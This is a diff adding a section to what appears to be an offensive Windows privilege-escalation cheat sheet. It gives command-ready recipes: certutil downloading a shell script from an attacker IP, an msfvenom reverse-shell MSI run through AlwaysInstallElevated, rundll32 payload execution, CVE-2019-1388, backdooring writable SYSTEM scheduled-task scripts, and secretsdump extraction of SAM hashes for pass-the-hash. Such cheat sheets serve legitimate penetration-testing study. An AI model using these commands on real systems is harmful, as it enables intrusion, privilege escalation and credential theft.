@@ -3675,3 +3675,182 @@ Useful when:
 * No keystroke logging is possible
 
 ---
+
+# 📝 Miscellaneous  Techniques
+
+## Living Off The Land Binaries and Scripts (LOLBAS)
+
+**LOLBAS** documents Microsoft-signed binaries/scripts that can be abused for offensive operations.
+
+### Common Abuse Capabilities
+
+* Code execution
+* Code compilation
+* File transfer
+* Persistence
+* UAC bypass
+* Credential theft
+* Dumping memory
+* Keylogging
+* Evasion
+* DLL hijacking
+
+## Certutil Abuse
+
+### **Download File**
+
+```powershell
+certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+```
+
+### **Encode (Base64)**
+
+```powershell
+certutil -encode file1 encodedfile
+```
+
+### **Decode**
+
+```powershell
+certutil -decode encodedfile file2
+```
+
+### Rundll32 Execution
+
+Execute a malicious DLL for reverse shells or payloads:
+
+```powershell
+rundll32.exe payload.dll,EntryPoint
+```
+
+## AlwaysInstallElevated Privilege Escalation
+
+If enabled in both HKCU and HKLM, any user can run MSI packages as **SYSTEM**.
+
+### **Registry Check**
+
+```powershell
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+Look for:
+
+```
+AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+### **Generating Malicious MSI**
+
+```bash
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+```
+
+### **Execution**
+
+```powershell
+msiexec /i aie.msi /quiet /qn /norestart
+```
+
+## CVE-2019-1388 Privilege Escalation (Certificate Dialog Bug)
+
+**Vulnerability:** UAC certificate dialog loads a hyperlink from a signed binary’s certificate using SYSTEM privileges.
+
+### Key Points
+
+* Exploit with **hhupd.exe** (old Microsoft-signed installer).
+* Certificate → Details contains OID **1.3.6.1.4.1.311.2.1.10**
+* Clicking hyperlink launches browser as **SYSTEM**.
+* From browser → View Page Source → Save As → run `cmd.exe` as SYSTEM.
+
+## Scheduled Tasks Enumeration
+
+### CMD
+
+```cmd
+schtasks /query /fo LIST /v
+```
+
+### PowerShell
+
+```powershell
+Get-ScheduledTask | select TaskName, State
+```
+
+### Weak Permissions Scenario
+
+If a scheduled task runs as SYSTEM and references a script with weak permissions:
+
+* Check permissions:
+
+```powershell
+accesschk64.exe /accepteula -s -d C:\Scripts\
+```
+
+* If USERS have write access → append malicious payload to script → wait for task to run.
+
+
+## User/Computer Description Field Abuse
+
+Admin passwords are sometimes improperly stored in description fields.
+
+### Enumerate Local User Descriptions
+
+```powershell
+Get-LocalUser
+```
+
+### Enumerate Computer Description
+
+```powershell
+Get-WmiObject -Class Win32_OperatingSystem | select Description
+```
+
+
+## Mounting Virtual Disks (VHD, VHDX, VMDK)
+
+### On Linux
+
+#### Mount VMDK
+
+```bash
+guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
+```
+
+#### Mount VHDX
+
+```bash
+guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
+```
+
+### On Windows
+
+* Right-click → **Mount**
+* Or use:
+
+```powershell
+Mount-VHD
+```
+
+* Or VMware Workstation → *Map Virtual Disks*
+
+
+## Extracting Windows Password Hashes (secretsdump)
+
+If you can access the VHD/VMDK contents → retrieve SAM, SECURITY, SYSTEM hives.
+
+### Extract Hashes
+
+```bash
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+### Example Output
+
+* Local admin NTLM hashes
+* Cached domain logon credentials
+
+These can be cracked or used for pass-the-hash attacks.
+
+---
+
